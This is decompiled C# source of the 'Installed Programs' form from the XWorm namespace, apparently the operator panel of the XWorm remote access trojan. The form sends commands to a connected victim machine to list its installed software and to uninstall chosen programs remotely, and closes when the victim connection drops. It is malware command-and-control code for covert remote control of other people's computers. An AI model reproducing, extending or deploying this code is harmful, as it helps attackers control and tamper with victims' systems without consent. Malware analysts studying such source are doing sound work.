#define DEBUG
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;

namespace XWorm;

[DesignerGenerated]
public class Programs : Form
{
	[CompilerGenerated]
	internal sealed class _Closure_0024__R56_002D4
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R56_002D4(_Closure_0024__R56_002D4 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R6(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ListView1")]
	private ListView _ListView1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Timer1")]
	private System.Windows.Forms.Timer _Timer1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem4")]
	private ToolStripMenuItem _ToolStripMenuItem4;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("UninstallToolStripMenuItem1")]
	private ToolStripMenuItem _UninstallToolStripMenuItem1;

	public GClass5 gclass5_0;

	public ListView ListView1
		;

	[field: AccessedThroughProperty("ColumnHeader1")]
	public ColumnHeader ColumnHeader1
	;

	[field: AccessedThroughProperty("ColumnHeader3")]
	public ColumnHeader ColumnHeader3
	;

	[field: AccessedThroughProperty("StatusStrip1")]
	public StatusStrip StatusStrip1
	;

	[field: AccessedThroughProperty("ToolStripStatusLabel1")]
	public ToolStripStatusLabel ToolStripStatusLabel1
	;

	[field: AccessedThroughProperty("ToolStripStatusLabel2")]
	public ToolStripStatusLabel ToolStripStatusLabel2
	;

	public System.Windows.Forms.Timer Timer1
	;

	[field: AccessedThroughProperty("ImageList1")]
	public ImageList ImageList1
	;

	[field: AccessedThroughProperty("Guna2ContextMenuStrip1")]
	public Guna2ContextMenuStrip Guna2ContextMenuStrip2
	;

	public ToolStripMenuItem ToolStripMenuItem4
	;

	public ToolStripMenuItem UninstallToolStripMenuItem1
	;

	public Programs()
	{
		base.Load += Programs_Load;
		base.FormClosing += Programs_FormClosing;
		InitializeComponent();
		this.ImageList1.Images.SetKeyName(0, "icons8-hdd-20.png");
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(XWorm.Programs));
		this.ListView1 = new System.Windows.Forms.ListView();
		this.ColumnHeader1 = new System.Windows.Forms.ColumnHeader();
		this.ColumnHeader3 = new System.Windows.Forms.ColumnHeader();
		this.ImageList1 = new System.Windows.Forms.ImageList(this.components);
		this.StatusStrip1 = new System.Windows.Forms.StatusStrip();
		this.ToolStripStatusLabel1 = new System.Windows.Forms.ToolStripStatusLabel();
		this.ToolStripStatusLabel2 = new System.Windows.Forms.ToolStripStatusLabel();
		this.Timer1 = new System.Windows.Forms.Timer(this.components);
		this.Guna2ContextMenuStrip2 = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
		this.ToolStripMenuItem4 = new System.Windows.Forms.ToolStripMenuItem();
		this.UninstallToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.StatusStrip1.SuspendLayout();
		this.Guna2ContextMenuStrip2.SuspendLayout();
		base.SuspendLayout();
		this.ListView1.SelectedIndexChanged += new System.EventHandler(ListView1_SelectedIndexChanged);
		this.ListView1.KeyDown += new System.Windows.Forms.KeyEventHandler(ListView1_KeyDown);
		this.Timer1.Tick += new System.EventHandler(Timer1_Tick);
		this.ToolStripMenuItem4.Click += new System.EventHandler(ToolStripMenuItem4_Click);
		this.UninstallToolStripMenuItem1.Click += new System.EventHandler(UninstallToolStripMenuItem1_Click);
		this.ListView1.BackColor = System.Drawing.Color.White;
		this.ListView1.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.ListView1.Columns.AddRange(new System.Windows.Forms.ColumnHeader[2] { this.ColumnHeader1, this.ColumnHeader3 });
		this.ListView1.ContextMenuStrip = this.Guna2ContextMenuStrip2;
		this.ListView1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.ListView1.Font = new System.Drawing.Font("Tahoma", 8f);
		this.ListView1.ForeColor = System.Drawing.Color.Black;
		this.ListView1.FullRowSelect = true;
		this.ListView1.HeaderStyle = System.Windows.Forms.ColumnHeaderStyle.Nonclickable;
		this.ListView1.HideSelection = false;
		this.ListView1.Location = new System.Drawing.Point(0, 0);
		this.ListView1.Name = "ListView1";
		this.ListView1.Size = new System.Drawing.Size(469, 285);
		this.ListView1.SmallImageList = this.ImageList1;
		this.ListView1.Sorting = System.Windows.Forms.SortOrder.Ascending;
		this.ListView1.TabIndex = 3;
		this.ListView1.UseCompatibleStateImageBehavior = false;
		this.ListView1.View = System.Windows.Forms.View.Details;
		this.ColumnHeader1.Text = "[ Name ]";
		this.ColumnHeader1.Width = 107;
		this.ColumnHeader3.Text = "[ UninstallString ]";
		this.ColumnHeader3.Width = 117;
		this.ImageList1.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("ImageList1.ImageStream");
		this.ImageList1.TransparentColor = System.Drawing.Color.Transparent;
		this.StatusStrip1.BackColor = System.Drawing.Color.White;
		this.StatusStrip1.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.StatusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.ToolStripStatusLabel1, this.ToolStripStatusLabel2 });
		this.StatusStrip1.Location = new System.Drawing.Point(0, 285);
		this.StatusStrip1.Name = "StatusStrip1";
		this.StatusStrip1.Padding = new System.Windows.Forms.Padding(1, 0, 9, 0);
		this.StatusStrip1.Size = new System.Drawing.Size(469, 22);
		this.StatusStrip1.TabIndex = 4;
		this.StatusStrip1.Text = "StatusStrip1";
		this.ToolStripStatusLabel1.ForeColor = System.Drawing.Color.Black;
		this.ToolStripStatusLabel1.Name = "ToolStripStatusLabel1";
		this.ToolStripStatusLabel1.Size = new System.Drawing.Size(68, 17);
		this.ToolStripStatusLabel1.Text = "Selected [0]";
		this.ToolStripStatusLabel2.ForeColor = System.Drawing.Color.Black;
		this.ToolStripStatusLabel2.Name = "ToolStripStatusLabel2";
		this.ToolStripStatusLabel2.Size = new System.Drawing.Size(13, 17);
		this.ToolStripStatusLabel2.Text = "..";
		this.Timer1.Enabled = true;
		this.Timer1.Interval = 1000;
		this.Guna2ContextMenuStrip2.Items.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.ToolStripMenuItem4, this.UninstallToolStripMenuItem1 });
		this.Guna2ContextMenuStrip2.Name = "Guna2ContextMenuStrip2";
		this.Guna2ContextMenuStrip2.RenderStyle.ArrowColor = System.Drawing.Color.FromArgb(151, 143, 255);
		this.Guna2ContextMenuStrip2.RenderStyle.BorderColor = System.Drawing.Color.Gainsboro;
		this.Guna2ContextMenuStrip2.RenderStyle.ColorTable = null;
		this.Guna2ContextMenuStrip2.RenderStyle.RoundedEdges = true;
		this.Guna2ContextMenuStrip2.RenderStyle.SelectionArrowColor = System.Drawing.Color.White;
		this.Guna2ContextMenuStrip2.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(113, 74, 250);
		this.Guna2ContextMenuStrip2.RenderStyle.SelectionForeColor = System.Drawing.Color.White;
		this.Guna2ContextMenuStrip2.RenderStyle.SeparatorColor = System.Drawing.Color.Gainsboro;
		this.Guna2ContextMenuStrip2.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.ClearTypeGridFit;
		this.Guna2ContextMenuStrip2.Size = new System.Drawing.Size(135, 48);
		this.ToolStripMenuItem4.BackColor = System.Drawing.Color.White;
		this.ToolStripMenuItem4.Image = (System.Drawing.Image)resources.GetObject("ToolStripMenuItem4.Image");
		this.ToolStripMenuItem4.Name = "ToolStripMenuItem4";
		this.ToolStripMenuItem4.Size = new System.Drawing.Size(134, 22);
		this.ToolStripMenuItem4.Text = "[ Refresh ]";
		this.UninstallToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.UninstallToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("UninstallToolStripMenuItem1.Image");
		this.UninstallToolStripMenuItem1.Name = "UninstallToolStripMenuItem1";
		this.UninstallToolStripMenuItem1.Size = new System.Drawing.Size(134, 22);
		this.UninstallToolStripMenuItem1.Text = "[ Uninstall ]";
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(469, 307);
		base.Controls.Add(this.ListView1);
		base.Controls.Add(this.StatusStrip1);
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.Name = "Programs";
		this.Text = "Installed Programs";
		this.StatusStrip1.ResumeLayout(false);
		this.StatusStrip1.PerformLayout();
		this.Guna2ContextMenuStrip2.ResumeLayout(false);
		base.ResumeLayout(false);
		base.PerformLayout();
	}

	private void Programs_Load(object sender, EventArgs e)
	{
		method_0();
	}

	public void method_0()
	{
		ListView1.Items.Clear();
		ToolStripStatusLabel2.Text = "Wait..";
		byte[] array = Module0.smethod_6("GetPrograms");
		GClass5 gClass = gclass5_0;
		ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
		{
			gClass.method_1((byte[])a0);
		}, array);
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			if (!gclass5_0.bool_0)
			{
				Close();
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void ListView1_SelectedIndexChanged(object sender, EventArgs e)
	{
		try
		{
			ToolStripStatusLabel1.Text = "Selected [" + ListView1.SelectedItems.Count + "]";
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void ListView1_KeyDown(object sender, KeyEventArgs e)
	{
		try
		{
			if (e.Modifiers != Keys.Control || e.KeyCode != Keys.A || ListView1.Items.Count <= 0)
			{
				return;
			}
			foreach (ListViewItem item in ListView1.Items)
			{
				item.Selected = true;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void Programs_FormClosing(object sender, FormClosingEventArgs e)
	{
		byte[] array = Module0.smethod_6("ClosePrograms");
		GClass5 gClass = gclass5_0;
		ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
		{
			gClass.method_1((byte[])a0);
		}, array);
	}

	private void ToolStripMenuItem4_Click(object sender, EventArgs e)
	{
		method_0();
	}

	private void UninstallToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		_Closure_0024__R56_002D4 closure_0024__R56_002D = default(_Closure_0024__R56_002D4);
		foreach (ListViewItem selectedItem in ListView1.SelectedItems)
		{
			byte[] array = Module0.smethod_6("UNSPrograms" + GClass19.string_0 + selectedItem.SubItems[1].Text);
			closure_0024__R56_002D = new _Closure_0024__R56_002D4(closure_0024__R56_002D);
			closure_0024__R56_002D._0024VB_0024NonLocal_2 = gclass5_0;
			ThreadPool.QueueUserWorkItem(closure_0024__R56_002D._Lambda_0024__R6, array);
		}
	}
}